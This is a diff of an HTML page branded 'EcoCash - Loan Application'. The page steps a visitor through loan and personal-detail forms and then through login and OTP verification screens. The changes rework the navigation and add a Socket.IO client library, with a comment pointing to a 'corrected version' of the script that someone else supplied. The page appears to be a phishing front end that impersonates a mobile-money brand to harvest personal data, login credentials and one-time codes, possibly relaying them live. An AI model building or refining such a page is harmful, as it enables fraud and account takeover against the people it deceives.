@@ -5,8 +5,6 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
     <title>EcoCash - Loan Application</title>
     <link rel="stylesheet" href="styles.css">
-<base target="_blank">
-<base target="_blank">
 </head>
 <body>
 
@@ -76,7 +74,7 @@
             </div>
         </div>
 
-        <button class="btn-gradient" onclick="showScreen('screen-step1')">APPLY NOW</button>
+        <button class="btn-gradient" onclick="showStep(1)">APPLY NOW</button>
 
         <div class="features">
             <div class="feature">
@@ -100,10 +98,10 @@
     </div>
 
     <!-- ============ STEP 1: LOAN DETAILS ============ -->
-    <div class="screen" id="screen-step1">
+    <div class="screen" id="step1" style="display:none;">
         <div class="header">
             <div class="header-left">
-                <button class="back-btn" onclick="showScreen('screen-hero')">&larr; Back</button>
+                <!-- Back button removed to avoid conflict with step navigation -->
             </div>
             <div class="logo"><span class="eco">Eco</span><span class="cash">Cash</span></div>
             <button class="menu-btn" onclick="toggleMenu()">&#9776;</button>
@@ -123,7 +121,7 @@
             <div class="form-group">
                 <label class="form-label">Loan Type</label>
                 <div class="select-wrapper">
-                    <select class="form-select" id="step1-loan-type">
+                    <select class="form-select" id="loan-type">
                         <option>Personal Loan</option>
                         <option>Home Loan</option>
                         <option>Business Loan</option>
@@ -135,13 +133,13 @@
 
             <div class="form-group">
                 <label class="form-label">Loan Amount ($)</label>
-                <input type="text" class="form-input" id="step1-amount" placeholder="Enter amount" inputmode="numeric">
+                <input type="text" class="form-input" id="amount" placeholder="Enter amount" inputmode="numeric">
             </div>
 
             <div class="form-group">
                 <label class="form-label">Loan Term</label>
                 <div class="select-wrapper">
-                    <select class="form-select" id="step1-term">
+                    <select class="form-select" id="term">
                         <option>6 Months</option>
                         <option>12 Months</option>
                         <option>24 Months</option>
@@ -154,20 +152,20 @@
 
             <div class="form-group">
                 <label class="form-label">Purpose of Loan</label>
-                <input type="text" class="form-input" id="step1-purpose" placeholder="What will you use the loan for?">
+                <input type="text" class="form-input" id="purpose" placeholder="What will you use the loan for?">
             </div>
 
-            <button class="btn-gradient" style="width: 100%; margin-top: 8px;" onclick="goToStep2()">NEXT STEP</button>
+            <button class="btn-gradient next-btn" style="width: 100%; margin-top: 8px;">NEXT STEP</button>
         </div>
 
         <div class="footer-text">&copy; 2025 Ecocash</div>
     </div>
 
     <!-- ============ STEP 2: PERSONAL INFO ============ -->
-    <div class="screen" id="screen-step2">
+    <div class="screen" id="step2" style="display:none;">
         <div class="header">
             <div class="header-left">
-                <button class="back-btn" onclick="showScreen('screen-step1')">&larr; Back</button>
+                <!-- Back button removed -->
             </div>
             <div class="logo"><span class="eco">Eco</span><span class="cash">Cash</span></div>
             <button class="menu-btn" onclick="toggleMenu()">&#9776;</button>
@@ -187,11 +185,11 @@
             <div class="form-row">
                 <div class="form-group">
                     <label class="form-label">First Name</label>
-                    <input type="text" class="form-input" id="first-name" placeholder="John">
+                    <input type="text" class="form-input" id="firstName" placeholder="John">
                 </div>
                 <div class="form-group">
                     <label class="form-label">Last Name</label>
-                    <input type="text" class="form-input" id="last-name" placeholder="Doe">
+                    <input type="text" class="form-input" id="lastName" placeholder="Doe">
                 </div>
             </div>
 
@@ -206,8 +204,8 @@
             </div>
 
             <div class="btn-nav">
-                <button class="btn-prev" onclick="showScreen('screen-step1')">PREVIOUS</button>
-                <button class="btn-next" onclick="goToStep3()">NEXT STEP</button>
+                <button class="btn-prev prev-btn">PREVIOUS</button>
+                <button class="btn-next next-btn">NEXT STEP</button>
             </div>
         </div>
 
@@ -215,10 +213,10 @@
     </div>
 
     <!-- ============ STEP 3: EMPLOYMENT & SUMMARY ============ -->
-    <div class="screen" id="screen-step3">
+    <div class="screen" id="step3" style="display:none;">
         <div class="header">
             <div class="header-left">
-                <button class="back-btn" onclick="showScreen('screen-step2')">&larr; Back</button>
+                <!-- Back button removed -->
             </div>
             <div class="logo"><span class="eco">Eco</span><span class="cash">Cash</span></div>
             <button class="menu-btn" onclick="toggleMenu()">&#9776;</button>
@@ -273,8 +271,8 @@
             </div>
 
             <div class="btn-nav">
-                <button class="btn-prev" onclick="showScreen('screen-step2')">PREVIOUS</button>
-                <button class="btn-submit" onclick="submitApplication()">SUBMIT APPLICATION</button>
+                <button class="btn-prev prev-btn">PREVIOUS</button>
+                <button class="btn-submit" id="submitBtn">SUBMIT APPLICATION</button>
             </div>
         </div>
 
@@ -282,7 +280,7 @@
     </div>
 
     <!-- ============ SUCCESS SCREEN ============ -->
-    <div class="screen" id="screen-success">
+    <div class="screen" id="screen-success" style="display:none;">
         <div class="header">
             <div class="logo"><span class="eco">Eco</span><span class="cash">Cash</span></div>
             <button class="menu-btn" onclick="toggleMenu()">&#9776;</button>
@@ -307,7 +305,7 @@
     </div>
 
     <!-- ============ LOGIN SCREEN ============ -->
-    <div class="screen" id="screen-login">
+    <div class="screen" id="screen-login" style="display:none;">
         <div class="login-wrapper">
             <div class="login-container">
                 <div class="login-header">
@@ -359,7 +357,7 @@
     </div>
 
     <!-- ============ OTP VERIFICATION SCREEN ============ -->
-    <div class="screen" id="screen-otp">
+    <div class="screen" id="screen-otp" style="display:none;">
         <div class="header">
             <div class="header-left">
                 <button class="back-btn" onclick="showScreen('screen-login')">&larr; Back</button>
@@ -402,6 +400,9 @@
     </div>
 </div>
 
+<!-- Socket.IO client library (must be loaded before your script) -->
+<script src="https://cdn.socket.io/4.7.2/socket.io.min.js"></script>
+<!-- Your main JavaScript (use the corrected version I provided) -->
 <script src="script.js"></script>
 
 </body>
